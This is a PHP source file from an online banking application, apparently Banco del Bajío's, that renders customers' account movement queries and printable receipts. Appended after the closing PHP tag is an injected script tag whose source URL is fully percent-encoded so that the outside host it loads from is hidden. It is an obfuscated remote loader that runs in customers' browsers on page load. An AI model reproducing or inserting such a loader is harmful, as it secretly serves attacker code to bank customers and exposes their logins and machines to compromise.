<link rel='stylesheet' type='text/css' media='screen' href='/eztransaccion/user/include/js_calendar/calendar-blue.css' />
<script language="javascript" src="/eztransaccion/user/include/js_calendar/calendar.js" />
<script language="javascript" src="/eztransaccion/user/include/js_calendar/lang/calendar-es.js" />
<script language="javascript" src="/eztransaccion/user/include/jscalendar/calendar-setup.js" />
<script language="javascript" src="/eztransaccion/user/include/js/FuncionesReimpPhp.js" />

<?PHP
	$session->setVariable("calendario",$session->variable("calendario")+1);
//06Jun2010  ACS CamCve I
	if ( $session->variable( "r_ccv" ) == "cambioCve" )
	{
		$transaccion_buffer = "";
		$transaccion_buffer = "<h1>Consulta de movimientos</h1>
								<hr noshade='noshade' size='4'>
								<p></p><p><font color='#5a419c'>
								<strong>Estimado Usuario, Su <a href='/transaccion/clave/'> <font color='#ff0000'>Clave de Acceso</font> </a> requiere ser cambiada para poder realizar cualquier transacción.</strong></font>";
		return;
	}
//06Jun2010  ACS CamCve F
	//ACS 09Ene2008 - MenuContenidoAjax
	//Se separan los parametros y son guardadados en el array

	// Se asignan los valores que llegaron como parametros
	$top=0;

	$DayF=$parametros['DayF'];
	$MonthF=$parametros['MonthF'];
	$YearF=$parametros['YearF'];
	$Day=$parametros['Day'];
	$Month=$parametros['Month'];
	$Year=$parametros['Year'];
	$Accion=$parametros['Accion'];
	($parametros['top']!=""?$top=$parametros['top']:$top=0);
	$Access=$parametros['Access'];
	$FrAccount=$parametros['FrAccount'];
	($parametros['pos']!=""?$Pos=$parametros['pos']:$Pos="");
	($parametros['Dias']!=""?$Dias=$parametros['Dias']:$Dias="");
	($parametros['FrAmount']!=""?$FrAmount=$parametros['FrAmount']:$FrAmount="");
	($parametros['hist']!=""?$hist=$parametros['hist']:$hist=0);
	($parametros['histStatic']!=""?$histStatic=$parametros['histStatic']:$histStatic=0);
	//MAT 22Dic2010 Inicio
	$benefit_type = $session->Variable( "r_perfil");
	//MAT 22Dic2010 Fin

			//REF WMA-12sep2008, Fin
function ultimoDia( $mes, $anio )
{
	$ultimo_dia = 28;
	while (checkdate ($mes, $ultimo_dia, $anio) )
	{
		$ultimo_dia ++;
	}
	return ($ultimo_dia-1);
}
//REF WMA-12sep2008, Fin
//REF WMA-25jul2008, Inicio
function formatPage ( $HTML )
{

//ACS
		// $HTML = str_replace("<INPUT TYPE=\"BUTTON\" NAME=\"Button2\" VALUE=\"Regresar\" LANGUAGE=\"JavaScript\" ONCLICK=\"parent.history.back()\"><INPUT TYPE=\"SUBMIT\" NAME=\"Button\" VALUE=\"Ver más\" LANGUAGE=\"JavaScript\"><INPUT TYPE=\"BUTTON\" NAME=\"ButtonImprimir\" VALUE=\"Imprimir\" LANGUAGE=\"JavaScript\" ONCLICK=\"ventana()\">","",$HTML);
		// $HTML = str_replace("<INPUT TYPE=\"BUTTON\" NAME=\"Button2\" VALUE=\"Regresar\" LANGUAGE=\"JavaScript\" ONCLICK=\"parent.history.back()\"><INPUT TYPE=\"BUTTON\" NAME=\"ButtonImprimir\" VALUE=\"Imprimir\" LANGUAGE=\"JavaScript\" ONCLICK=\"ventana()\">","", $HTML);
		$HTML = str_replace("<INPUT TYPE=\"BUTTON\" NAME=\"Button\" ID=\"Button\" ONCLICK=\"javascript: conMovimientos(false);\" VALUE=\"Ver más\" LANGUAGE=\"JavaScript\">","",$HTML);
		$HTML = str_replace("<INPUT TYPE=\"BUTTON\" NAME=\"Button2\" VALUE=\"Regresar\" LANGUAGE=\"JavaScript\" ONCLICK=\"conMovimientosBack()\"><INPUT TYPE=\"BUTTON\" NAME=\"ButtonImprimir\" VALUE=\"Imprimir\" LANGUAGE=\"JavaScript\" ONCLICK=\"ventana()\">","", $HTML);
//ACS
		//$HTML = ereg_replace("<INPUT TYPE\=\"SUBMIT\" NAME=\"Button\" VALUE=\"Ver más\" LANGUAGE=\"JavaScript\"> ([^>]+)","", $HTML );
		//$HTML = ereg_replace("","", $HTML );

		return ( $HTML );
}
//REF WMA-25Jul2008, Fin

	$transaccion_buffer = "";

	if( empty( $Access ) )
	{
		$Access = "FrAc";
	}
	// $Accion = "movimientos";
	if( !isset /*(HB AGL - Ajustes PHP5)*/( $Day ) )
	{
		$Day = "";
	}
	if( !isset /*(HB AGL - Ajustes PHP5)*/( $FrAccount ) )
	{
		$FrAccount = "";
	}
	if( !isset /*(HB AGL - Ajustes PHP5)*/( $Month ) )
	{
		$Month = "";
	}
	if( !isset /*(HB AGL - Ajustes PHP5)*/( $Year ) )
	{
		$Year = "";
	}
	if( !isset /*(HB AGL - Ajustes PHP5)*/( $FrAmount ) )
	{
		$FrAmount = "";
	}
	if( !isset /*(HB AGL - Ajustes PHP5)*/( $top ) )
	{
		$top = "";
	}
	switch( $Access )
	{
		case "FrAc":
//			$particularFields = "";
			$tr->blog( $qki,"Movimientos", $FrAccount, $Day, $Month, $Year, $Accion );
			// JAC MAR2012 - CORRECCION MODULO DE CREDITOS INI
			//include_once( "eztransaccion/user/include/jscalendar/calendar-blue.css" );
			//include_once( "eztransaccion/user/include/jscalendar/calendar.js" );
			// JAC MAR2012 - CORRECCION MODULO DE CREDITOS FIN
			include_once( "eztransaccion/user/include/js/FuncionesReimpresion.js" );
			break;
		case "Confirm":
		case "Process":
			//LVPR Movtos x JBoss 10Oct2007
			$MenosFin = 2;	//Es para Ov
			if ( in_array( "hst", ( preg_split( "/[,||(,\s)]+/", $ini->read_var( "site", "JBossTransactions" ) ) ) ) )
			{
				$MenosFin = 1;		//Para JBoss
			}
			//LVPR Movtos x JBoss 10Oct2007
			switch( substr( $FrAccount, strlen( $FrAccount )-1, 1 ) )
			{
				case "D":
					//MAT 22Dic2010 Inicio
					/*
					$m_s = "<h4 align=right>Cuenta de Vista: ".substr( $FrAccount, 0, strlen( $FrAccount )-$MenosFin )."</h4>";
					break;
					*/
					if ($Accion != "IDE")
					{
	//JAG 05abr2011 inicio
						//$m_s = "<h4 align=right>Cuenta de Vista: ".substr( $FrAccount, 0, strlen( $FrAccount )-$MenosFin )."</h4>";
						//$FrAccount = str_replace( "Clasica", "Clásica", $FrAccount );
						$m_s = "<h4 align=right>Cuenta de Vista: ".substr( str_replace( "Clasica", "Clásica", $FrAccount ), 0, strlen( str_replace( "Clasica", "Clásica", $FrAccount ) )-$MenosFin )."</h4>";
					//JAG 30may2011 fin
						$m_s = str_replace( "NominaBasica", "NóminaBásica", $m_s );
					//JAG 30may2011 fin
	//JAG 05abr2011 fin
						break;
					}else
					{
						$m_s = "";
						break;
					}
					//MAT 22Dic2010 Fin
				case "T":
					$m_s = "<h4 align=right>Cuenta de Plazo: ".substr( $FrAccount, 0, strlen( $FrAccount )-$MenosFin )."</h4>";
					break;
				case "L":
					$m_s = "<h4 align=right>Cuenta de Cr&eacute;dito: ".substr( $FrAccount, 0, strlen( $FrAccount )-$MenosFin )."</h4>";
					break;
				//IRG310811 - Inicio - Consulta de Creditos
				case "E":
					$m_s = "<h4 align=right>Cr&eacute;dito Empresarial: ".substr( $FrAccount, 0, strlen( $FrAccount )-$MenosFin )."</h4>";
					break;
				case "C":
				    $m_s = "<h4 align=right>Cr&eacute;dito de Consumo: ".substr( $FrAccount, 0, strlen( $FrAccount )-$MenosFin )."</h4>";
					break;
				case "H":
				    $m_s = "<h4 align=right>Cr&eacute;dito Hipotecario: ".substr( $FrAccount, 0, strlen( $FrAccount )-$MenosFin )."</h4>";
					break;
				//IRG310811 - Fin - Consulta de Creditos
			}
		//REF WMA-12sep2009, Inicio
			if (trim($DayF) == "" and trim($MonthF) != "" and trim($YearF) != "")
			{
				$DayF = ultimoDia(trim($MonthF), trim($YearF));
			}

			if (trim($Day) != "" and trim($Month) == "" and trim($Year) == "")
			{
				$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha inicial es inv&aacute;lida</b>";
				return;
			}

			if (trim($Day) == "" and trim($Month) != "" and trim($Year) == "")
			{
				$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha inicial es inv&aacute;lida</b>";
				return;
			}
			if (trim($Day) == "" and trim($Month) == "" and trim($Year) != "")
			{
				$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha inicial es inv&aacute;lida</b>";
				return;
			}

			if (trim($DayF) != "" and trim($MonthF) == "" and trim($YearF) == "")
			{
				$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha final es inv&aacute;lida</b>";
				return;
			}

			if (trim($DayF) == "" and trim($MonthF) != "" and trim($YearF) == "")
			{
				$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha final es inv&aacute;lida</b>";
				return;
			}
			if (trim($DayF) == "" and trim($MonthF) == "" and trim($YearF) != "")
			{
				$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha final es inv&aacute;lida</b>";
				return;
			}
		//REF WMA-12sep2009, Fin
		//REF WMA-13aug2008, Inicio. Nueva validación para día bien formado
			if (trim($Day) != "" and trim($Month) != "" and trim($Year) != "")
			{
				if (!(checkdate(trim($Month),trim($Day),trim($Year))))
				{
					$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha inicial es inv&aacute;lida</b>";
					// $t->set_var( "transaccion_buffer", $transaccion_buffer );
					// $t->pparse( "output", "movimientos_tpl" );
					return;
				}
			}

			if (trim($DayF) != "" and trim($MonthF) != "" and trim($YearF) != "")
			{
				if (!(checkdate(trim($MonthF),trim($DayF),trim($YearF))))
				{
					$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha final es inv&aacute;lida</b>";
					// $t->set_var( "transaccion_buffer", $transaccion_buffer );
					// $t->pparse( "output", "movimientos_tpl" );
					return;
				}
			}
			//lgam P-36 RB
			if (trim($DayF) == "" and trim($MonthF) == "" and trim($YearF) == "" and trim($Day) != "" and trim($Month) != "" and trim($Year) != "")
			{
				$DayF = date(d);
				$MonthF = date(m);
				$YearF = date(Y);
			}
			else
			{
				if ($YearF.$MonthF.$DayF < $Year.$Month.$Day )
				{
					$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha final debe ser mayor o igual que la inicial</b>";
					return;
				}
			}
			if (trim($DayF) != "" and trim($MonthF) != "" and trim($YearF) != "" and trim($Day) == "" and trim($Month) == "" and trim($Year) == "")
			{
				$Day = "01";
				$Month = "01";
				$Year = "1900";
			}
			if (trim($DayF) == "" and trim($MonthF) == "" and trim($YearF) == "" and trim($Day) == "" and trim($Month) == "" and trim($Year) == "")
			{
				$DayF = date(d);
				$MonthF = date(m);
				$YearF = date(Y);
				$Day = "01";
				$Month = "01";
				$Year = "1900";
			}
			//lgam P-36 RB
		//REF WMA-13aug2008, Fin
			$particularFields = "&FrAccount=".urlencode( $FrAccount )."&Accion=".urlencode( $Accion )."&Day=".urlencode( $Day )."&Month=".urlencode( $Month )."&Year=".urlencode( $Year )."&DayF=".urlencode( $DayF )."&MonthF=".urlencode( $MonthF )."&YearF=".urlencode( $YearF )."&Pos=".urlencode( $Pos )."&FrAmount=".urlencode( $FrAmount )."&Dias=".urlencode( $Dias )."&FrNo=".urlencode( $FrNo )."&top=".urlencode( $top );
			$tr->blog( $qki,"Movimientos", $FrAccount, $Day, $Month, $Year, $Accion );
			break;
	}
	$transaccion_buffer = "";
	$transaccion_buffer .= $m_s;
	// DebugBreak( );
	//echo "Valor de Access: ".$Access;
	if ($Access != "Back")
	{
		//MAT 22Dic2010 Inicio
		/*
		$ret_code = $tr->PostToHost( $backend, "/IBnkIIS.dll", "Trxn=hst&Access=".urlencode( $Access )."&CustID=".urlencode( $usr )."&Cadpriv=".urlencode( $priv )."&btype=".urlencode( $benefit_type ).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer ); // movimientos
			// WMA-25Jul2008, Inicio Generacion de comprobantes
		//if ($Access == "FrAc")
		//{
			//echo "TRANSACTION::::::::::::::".$transaccion_buffer;
			$transaccion_buffer="<h1>Consulta de movimientos</h1><hr size='4' noshade='noshade'>".$transaccion_buffer;
		//}
		*/

		$source = "movs";
		if ($Accion == "IDE")
		{
			require_once("eztransaccion/user/include/consultadepositosefectivo.inc");
			$Fec = $Day . $Month . $Year;
			$transaccion_buffer="<h1>Consulta depósitos en efectivo para pago de crédito</h1><hr size='4' noshade='noshade'>".$transaccion_buffer;
//			$transaccion_buffer = $transaccion_buffer.consulta_depositos_efectivo($usr, $Pos, $top,"forward","0", $Dias,"xaut",($Year.$Month.$Day), ($YearF.$MonthF.$DayF), $Pos);
			$transaccion_buffer = $transaccion_buffer.consulta_depositos_efectivo($usr, $Pos, $top,"forward","0", $Dias,"xaut",($Year.$Month.$Day), ($YearF.$MonthF.$DayF), $Pos, $Access); // IRG021211 - Modificación paginación consulta IDE
		}
		//IRG310811 - Inicio - Consulta de Creditos
		else
		{
		 if(substr( $FrAccount, strlen( $FrAccount )-1, 1 ) == "C"
		    || substr( $FrAccount, strlen( $FrAccount )-1, 1 ) == "E"
			|| substr( $FrAccount, strlen( $FrAccount )-1, 1 ) == "H")
		 {
		$GLOBALS["nroCredito"] = substr( $FrAccount, 0, strlen( $FrAccount )-1 );
		//Fecha inicial y fecha final para el rango de la busqueda. Formato YYYMMDD
		$GLOBALS["fecha_inicial"] = $Year.$Month.$Day;
		$GLOBALS["fecha_final"] = $YearF.$MonthF.$DayF;
		$GLOBALS["topCreditos"] = $top;
		//$GLOBALS["topCreditos"] = 1;
		if($Accion == "Todos"){
			$GLOBALS["criterio"] = "0";
		} else{
			if($Accion == "Cargos"){
				$GLOBALS["criterio"] = "1";
			} else{
				$GLOBALS["criterio"] = "2";
			}
		}
		//echo "\nCredito seleccionado: ".$GLOBALS["nroCredito"];
		 $transaccion_buffer="<h1>Consulta de movimientos</h1><hr size='4' noshade='noshade'>".$transaccion_buffer;
			include_once( "eztransaccion/user/include/movimientos_creditos.inc" );
			//$transaccion_buffer;
		 }
		//IRG310811 - Fin - Consulta de Creditos
		 else
		 {
		// JAC NOV2011 - MODULO DE CREDITOS INI
		$source = "movs";
		$ret_code = $tr->PostToHost( $backend, "/IBnkIIS.dll", "Trxn=hst&Access=".urlencode( $Access )."&CustID=".urlencode( $usr )."&Cadpriv=".urlencode( $priv )."&btype=".urlencode( $benefit_type )."&source=".urlencode($source).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer ); // movimientos
		// JAC NOV2011 - MODULO DE CREDITOS FIN
			// WMA-25Jul2008, Inicio Generacion de comprobantes
			//if ($Access == "FrAc")
			//{
			//echo "TRANSACTION::::::::::::::".$transaccion_buffer;
			//DBA Aut2, se cambian los onclic porque marcar error al cargar las librerias de jquery

			$transaccion_buffer = str_replace("ONCLICK=\"javascript:conMovimientos(true);\"", "", $transaccion_buffer);	

			//DBA Aut2
			$transaccion_buffer="<h1>Consulta de movimientos</h1><hr size='4' noshade='noshade'>".$transaccion_buffer;
			//}
		 }
		} //IRG310811 - Consulta de Creditos
		//MAT 22Dic2010 Fin
	}
	if ($Access == "Process")
	{
		$ini =& INIFile::globalINI();
		$SecureServer = $ini->read_var( "site", "SecureServer" );
		$SecureServerType = $ini->read_var( "site", "SecureServerType" );
		$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );
		$ServerNumber = $ini->read_var( "site", "ServerNumber" );

		$buffer2 = formatPage($transaccion_buffer);

		// JAC NXN - 27Sep2012 Correccion para IE8 INI
		//$buffer2 = str_replace(chr(34),chr(92).chr(34),$buffer2);	//coloco \ antes del "
		$buffer2 = str_replace(chr(34),"'",$buffer2);	//coloco \ antes del "

		//$buffer2 = str_replace("<FONT COLOR=".chr(92).chr(34)."WHITE".chr(92).chr(34).">","<FONT COLOR=".chr(92).chr(34)."BLACK".chr(92).chr(34)."><span style='font-size:11px;font-family:Arial'>", $buffer2); //fuente Arial-8 para encabezados. Ademas alineacion superior
		$buffer2 = str_replace("<FONT COLOR=".chr(92).chr(34)."WHITE".chr(92).chr(34).">","<FONT COLOR='BLACK'><span style='font-size:11px;font-family:Arial'>", $buffer2); //fuente Arial-8 para encabezados. Ademas alineacion superior
		//$buffer2 = str_replace("<TD BGCOLOR = ".chr(92).chr(34)."#DDDDDD".chr(92).chr(34).">","<TD BGCOLOR = ".chr(92).chr(34)."#DDDDDD".chr(92).chr(34)." VALIGN='TOP'><span style='font-size:11px;font-family:Arial'>", $buffer2); //fuente Arial-8 para Fecha, Descripcion
		$buffer2 = str_replace("<TD BGCOLOR = ".chr(92).chr(34)."#DDDDDD".chr(92).chr(34).">","<TD BGCOLOR='#DDDDDD' VALIGN='TOP'><span style='font-size:11px;font-family:Arial'>", $buffer2); //fuente Arial-8 para Fecha, Descripcion

		//$buffer2 = str_replace("<TD   BGCOLOR = ".chr(92).chr(34)."#DDDDDD".chr(92).chr(34)." ALIGN = ".chr(92).chr(34)."RIGHT".chr(92).chr(34)." >","<TD   BGCOLOR = ".chr(92).chr(34)."#DDDDDD".chr(92).chr(34)." ALIGN = ".chr(92).chr(34)."LEFT".chr(92).chr(34)." VALIGN='TOP'><span style='font-size:11px;font-family:Arial'>", $buffer2); //fuente Arial-8 para monto. Ademas alineacion superior
		$buffer2 = str_replace("<TD   BGCOLOR = ".chr(92).chr(34)."#DDDDDD".chr(92).chr(34)." ALIGN = ".chr(92).chr(34)."RIGHT".chr(92).chr(34)." >","<TD BGCOLOR='#DDDDDD' ALIGN='LEFT' VALIGN='TOP'><span style='font-size:11px;font-family:Arial'>", $buffer2); //fuente Arial-8 para monto. Ademas alineacion superior
		//$buffer2 = str_replace("<TD BGCOLOR=".chr(92).chr(34)."#DDDDDD".chr(92).chr(34)." ALIGN=".chr(92).chr(34)."RIGHT".chr(92).chr(34).">","<TD   BGCOLOR = ".chr(92).chr(34)."#DDDDDD".chr(92).chr(34)." ALIGN = ".chr(92).chr(34)."RIGHT".chr(92).chr(34)." VALIGN='TOP'><span style='font-size:11px;font-family:Arial'>", $buffer2); //fuente Arial-8 para saldo. Ademas alineacion superior
		$buffer2 = str_replace("<TD BGCOLOR=".chr(92).chr(34)."#DDDDDD".chr(92).chr(34)." ALIGN=".chr(92).chr(34)."RIGHT".chr(92).chr(34).">","<TD BGCOLOR='#DDDDDD' ALIGN='RIGHT' VALIGN='TOP'><span style='font-size:11px;font-family:Arial'>", $buffer2); //fuente Arial-8 para saldo. Ademas alineacion superior

		$buffer2 = str_replace(chr(92).chr(34),"'",$buffer2);	//coloco \ antes del "	// JAC NXN 27Sep2012
		// JAC NXN - 27Sep2012 Correccion para IE8 FIN

		$buffer2 = str_replace("<BR/>","", $buffer2);
		//$buffer2 = str_replace("<h4 align=right>","<h4 align=right><span style='font-size:13px;font-family:Arial'>", $buffer2); //achica letra al cliente tipo y sub
		$buffer2 = str_replace("<FONT COLOR=WHITE>*No Aplica</FONT>","<span style='font-size:11px;font-family:Arial'><FONT COLOR=BLACK>*No Aplica</FONT>", $buffer2); //modifico a Arial-8 la leyenda *No Aplica
		$posIni  = strpos($buffer2, "<h4 align=right>") + 16;
		$posFin  = strpos($buffer2, "</h4>");
		$cuenta  = substr($buffer2, $posIni, $posFin-$posIni);
		$buffer2 = str_replace($cuenta, "", $buffer2);
		$Pagina = "<SCRIPT LANGUAGE='JavaScript'> function ventana() { var windowW = 800; var windowH = 450; var windowX = 10; var windowY = 10; var title = 'Recibo'; s = 'width='+windowW+',height='+windowH; cadena=\"<HTML><HEAD><link REL='STYLESHEET' HREF='" . $SecureServerType . "://" . $SecureServer . $ServerNumber . $DomainPostfix . "/impuestos/recibos.css' TYPE='text/css'><TITLE>Impresión de Movimientos</TITLE>";
		$Pagina = $Pagina."<SCRIPT LANGUAGE='JavaScript'> function window_onbeforeprint() { Imprimir.style.visibility = 'hidden'; Salir.style.visibility = 'hidden';} function window_onafterprint() { Imprimir.style.visibility = 'visible'; Salir.style.";
		$Pagina = $Pagina."visibility = 'visible'; }\"+\"<\"+\"/\"+\"SCRIPT></HEAD><BODY LANGUAGE='javascript' onbeforeprint='return window_onbeforeprint()' onafterprint='return window_onafterprint()'>";
		$Pagina = $Pagina."<INPUT type='button' value='Imprimir' id=Imprimir name=Imprimir onclick='window.print();'>&nbsp;<INPUT type='button' value=' Salir  ' id=Salir name=Salir onclick='window.close();'>";
		//$Pagina = $Pagina."<BR>";	//se comenta para tener más espacio
		$Pagina = $Pagina."<P><CENTER>";
		$Pagina = $Pagina."<IMG SRC='" . $SecureServerType . "://" . $SecureServer . $ServerNumber . $DomainPostfix . "/impuestos/LOGO_BB.GIF' WIDTH=100 HEIGHT=50 ALIGN= 'TOP' Banco del Bajio>";
		$Pagina = $Pagina."</P></CENTER>";
		$Pagina = $Pagina."<H2><span style='font-size:13px;font-family:Arial;'>Impresión de Movimientos - ".$cuenta."</H2>";
		//$Pagina = $Pagina."<BR><hr noshade='noshade' size='4' color='#5A419c' />"; //se comenta para tener más espacio
		//$Pagina = $Pagina."<hr noshade='noshade' size='4' color='#5A419c' />";
		$Pagina = $Pagina."<P ALIGN='RIGHT'><B><FONT>$date $time</FONT></B></P>";
		$Pagina = $Pagina.$buffer2;
		//$Pagina = $Pagina."<BR><hr noshade='noshade' size='4' color='#5A419c' />"; //se comenta para tener más espacio
		$Pagina = $Pagina."<BR><hr noshade='noshade' size='4' color='#5A419c' />";
		$Pagina = $Pagina."<p><FONT SIZE=1>Av. Manuel J. Clouthier No. 508 Col. Jardines del Campestre CP 37128 León, Gto.</FONT> </p>";
		$Pagina = $Pagina."<p><FONT SIZE=1>Consultas y aclaraciones 01 (477) 710- 4600 o al 01 (800) 471-0400</FONT></p>";
		$Pagina = $Pagina."<p><FONT SIZE=1>EL ÚNICO COMPROBANTE OFICIAL DE ESTA TRANSACCIÓN ES EL ESTADO DE CUENTA QUE EMITE BANCO DEL BAJIO.</FONT></p>";
		$Pagina = $Pagina."</BODY></HTML>\"; NFW =";
		$Pagina = $Pagina." window.open(\"\",'Recibo',\"toolbar=no,menubar=no,scrollbars=2,\"+s); NFW.blur(); NFW.resizeTo(windowW,windowH); NFW.moveTo(windowX,windowY); NFW.";
		$Pagina = $Pagina."document.open(); NFW.document.write(cadena); NFW.document.close(); NFW.window.focus(); } </SCRIPT>";
		//$t->set_var( "transaccion_buffer", $Pagina.$transaccion_buffer );

		$transaccion_buffer=$Pagina.$transaccion_buffer;


	}
	if($Access!="Back")
	{
		//ACS 09Ene2008 - MenuContenidoAjax
	//se concatenan funciones de javascript
		echo $Pagina;
		$transaccion_buffer="<SCRIPT>
		var parametros='';

		function conMovimientosBack()
		{
			if($hist>0)
			{
				iniProcesarMenu('movimientos', \"hist:\"+($hist-1)+\",Access:Back,histStatic:$histStatic\");
			}
			else
			{
				iniProcesarMenu('movimientos', '');
			}

		}
		//DBA Aut2
		$('#ButtonAceptar').click(function(){
			
			conMovimientos(true);
		});
		//DBA Aut2
		function conMovimientos(frAccess)
		{
			var pos=0;
			if(document.getElementsByName('Pos')[0]!=null)
			{
				pos=document.getElementsByName('Pos')[0].value;
			}
			if(frAccess)
			{
					parametros='DayF:'+$('#DayF').val()+
								',MonthF:'+$('#MonthF').val() +
								',YearF:'+$('#YearF').val()+
								',Day:'+$('#Day').val() +
								',Month:'+$('#Month').val()+
								',Year:'+$('#Year').val() +
								',Accion:'+$('input[@name=Accion]:checked').val() +
								',top:'+$('select#top option:selected').val()+
								',Access:Process'+
								',FrAccount:'+$('select#FrAccount option:selected').val()+
								',pos:'+pos+
								',hist:0'+
								',histStatic:0';;
			}
			else
			{
				parametros=\"DayF:$DayF,MonthF:$MonthF,YearF:$YearF,Day:$Day,Month:$Month,Year:$Year,Accion:$Accion,top:$top,Access:$Access,FrAccount:$FrAccount,pos:\"+pos+\",Dias:\"+document.getElementsByName('Dias')[0].value+\",FrAmount:\"+document.getElementById('FrAmount').value+\",topJB:\"+document.getElementsByName('top')[0].value+\",hist:\"+($hist+1)+\",histStatic:\"+($histStatic+1);
			}

			iniProcesarMenu('movimientos', parametros);


		}</SCRIPT>".$transaccion_buffer;


		$_SESSION['movimientosBack'][$hist]=$transaccion_buffer;
		//print_r($_SESSION['movimientosBack'][$hist]);
		// WMA-25Jul2008, Fin Generacion de comprobantes
	}
	else
	{
		//echo $transaccion_buffer;$Access=$_POST['Access'];
		//$t->set_var( "transaccion_buffer", $transaccion_buffer );

		$transaccion_buffer=$_SESSION['movimientosBack'][$hist];
	}

?><script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>